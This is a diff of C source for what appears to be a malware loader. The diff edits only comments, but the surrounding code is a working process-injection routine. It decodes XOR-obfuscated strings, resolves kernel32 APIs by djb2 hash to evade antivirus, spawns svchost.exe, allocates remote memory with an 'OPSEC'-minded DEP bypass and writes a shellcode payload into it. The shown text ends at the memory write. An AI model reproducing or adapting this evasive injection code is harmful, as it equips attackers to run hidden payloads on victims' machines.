@@ -3,7 +3,7 @@
 #include "evasion.h"
 #include <stdio.h>
 
-// --- typedefs definition
+// --- TYPEDEFS DEFINITION
 typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
@@ -12,15 +12,13 @@ typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBU
 typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
 
 bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
-    // load key runtime (in stack)
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
     
+    // --- ENCODED STRINGS DEFINITION
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
-    // using "C:\Windows\System32\svchost.exe" as target process
-    // MODIFY: use /tools/string_encryptor.py to change process
-    char enc_target_process[] = { 0x1c, 0x49, 0x29, 0x27, 0x5a, 0x1d, 0x57, 0x0c, 0x05, 0x40, 0x28, 0x38, 0x4a, 0x0a, 0x2b, 0x3a, 0x1e, 0x46, 0x42, 0x6f, 0x00, 0x45, 0x00, 0x1a, 0x5c, 0x07, 0x1f, 0x1d, 0x1c, 0x27, 0x3a, 0x73, 0x75 };
+    char enc_target_process[] = { 0x1c, 0x49, 0x29, 0x27, 0x5a, 0x1d, 0x57, 0x0c, 0x05, 0x40, 0x28, 0x38, 0x4a, 0x0a, 0x2b, 0x3a, 0x1e, 0x46, 0x42, 0x6f, 0x00, 0x45, 0x00, 0x1a, 0x5c, 0x07, 0x1f, 0x1d, 0x1c, 0x27, 0x3a, 0x73, 0x75 };       // "C:\Windows\System32\svchost.exe"
 
-    // API hashes
+    // --- API HASHES DEFINITION
     DWORD hash_CreateProc = 0xAEB52E19;     // djb2 for "CreateProcessA"
     DWORD hash_VirtAllocEx = 0xF36E5AB4;    // djb2 for "VirtualAllocEx"
     DWORD hash_WriteProcMem = 0x6F22E8C8;   // djb2 for "WriteProcessMemory"
@@ -28,16 +26,15 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     DWORD hash_CreateRemThrd = 0xAA30775D;  // djb2 for "CreateRemoteThread"
     DWORD hash_CloseHandle = 0x3870CA07;    // djb2 for "CloseHandle"
 
-    // --- load DLL dynamically
+    // --- DYNAMIC DLL LOAD
 
-    // kernel32.dll
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len); 
 
     if (!hKernel32) return false;
 
-    // --- dynamic resolution via hashing
+    // --- DYNAMIC API RESOLUTION VIA HASHING
 
     pCreateProcessA fnCreateProcessA = (pCreateProcessA) get_api_by_hash(hKernel32, hash_CreateProc);
     pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx) get_api_by_hash(hKernel32, hash_VirtAllocEx);
@@ -46,10 +43,9 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread) get_api_by_hash(hKernel32, hash_CreateRemThrd);
     pCloseHandle fnCloseHandle = (pCloseHandle) get_api_by_hash(hKernel32, hash_CloseHandle);
 
-    // if AV blocks a function -> return
     if (!fnCreateProcessA || !fnVirtualAllocEx || !fnWriteProcessMemory || !fnVirtualProtectEx || !fnCreateRemoteThread || !fnCloseHandle) return false;
 
-    // --- setup target process (svchost.exe)
+    // --- TARGET PROCESS SETUP
 
     STARTUPINFOA si = { 0 };
     si.cb = sizeof(si);
@@ -68,7 +64,7 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
 
     if (!proc_created) return false;
 
-    // --- prepare memory (DEP bypass)
+    // --- MEMORY PREPARATION LOGIC (DEP BYPASS)
 
     // NOTE: using PAGE_READWRITE flag -> better OPSEC than PAGE_EXECUTE_READWRITE
     LPVOID remote_buffer = fnVirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -79,7 +75,7 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
         return false;
     }
 
-    // --- write shellcode
+    // --- MEMORY WRITE LOGIC
 
     SIZE_T bytes_written;
     if (!fnWriteProcessMemory(pi.hProcess, remote_buffer, payload_buffer, payload_size, &bytes_written)) {
